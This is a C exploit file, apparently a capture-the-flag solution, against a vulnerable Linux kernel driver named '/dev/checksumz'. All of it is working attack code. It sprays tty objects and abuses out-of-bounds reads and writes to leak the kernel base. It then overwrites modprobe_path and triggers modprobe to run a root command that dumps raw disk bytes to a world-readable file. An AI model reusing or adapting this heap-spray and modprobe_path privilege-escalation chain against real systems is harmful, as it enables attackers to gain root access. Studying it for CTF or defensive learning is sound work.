#include "libpwn.c"
#include "api.h"

#define DEVICE "/dev/checksumz"
#define MAX_WRITE 16
#define MAX_READ 512 
#define MODPROBE_OFFSET 0x1b3f100
#define SPRAY_WIDTH 30
#define KOBJ_SIZE 0x400

int tty[SPRAY_WIDTH*2];
char buffer[KOBJ_SIZE*2] = {0x0};
int fd;

void checksumz_lseek(u64 offset, u64 whence) {
    if (lseek(fd, offset, whence) < 0) {
        panic("lseek");
    }
}

void checksumz_write(char *buffer, u64 size) {
    if (write(fd, buffer, size) < 0) {
        panic("write");
    }
}

void checksumz_read(char *buffer, u64 size) {
    if (read(fd, buffer, size) < 0) {
        panic("read");
    }
}

int main() {
    for(int i = 0; i < SPRAY_WIDTH; i++) {
        tty[i] = open(TTY_FILE, O_RDWR | O_NOCTTY);
        if(tty[i] < 0) {
            error("open ptmx");
        }
    }

    fd = open(DEVICE, O_RDWR);
    if (fd < 0) {
        panic("open");
    }

    for(int i = SPRAY_WIDTH; i < SPRAY_WIDTH*2; i++) {
        tty[i] = open(TTY_FILE, O_RDWR | O_NOCTTY);
        if(tty[i] < 0) {
            error("open ptmx");
        }
    }

    // overwrite size
    checksumz_lseek(512-0x8, SEEK_SET);
    unsigned long *payload = (unsigned long *)&buffer;
    *payload++ = 0x0;
    *payload++ = 0x2000;
    checksumz_write(buffer, MAX_WRITE);

    // OOB 
    checksumz_lseek(0x400-0x8, SEEK_SET);
    checksumz_read(buffer, MAX_READ);    
    dump_hex(buffer, MAX_READ);

    kbase = ((u64*)buffer)[4] - 0x1289480;
    u64 modprobe_path = kbase + MODPROBE_OFFSET;
    validate_kbase();
    info2("modprobe_path", modprobe_path);

    // overwrite name ptr
    checksumz_lseek(512+0x10, SEEK_SET);
    memset(buffer, 0x0, sizeof(buffer));
    payload = (unsigned long *)&buffer;
    *payload++ = modprobe_path;
    checksumz_write(buffer, MAX_WRITE);

    // overwrite modprobe
    memset(buffer, 0, sizeof(buffer));
    memcpy(buffer, DEFAULT_EVIL_MODPROBE_PATH, sizeof(DEFAULT_EVIL_MODPROBE_PATH));
    if (ioctl(fd, CHECKSUMZ_IOCTL_RENAME, &buffer) < 0) {
        panic("ioctl rename");
    }
    modprobe_attack("dd if=/dev/vda bs=1 count=64 skip=0 > /tmp/flag; chmod 777 /tmp/flag", DEFAULT_MODPROBE_TRIGGER, DEFAULT_EVIL_MODPROBE_PATH);
    system("cat /tmp/flag");

    _pause_("end of exploit...");
}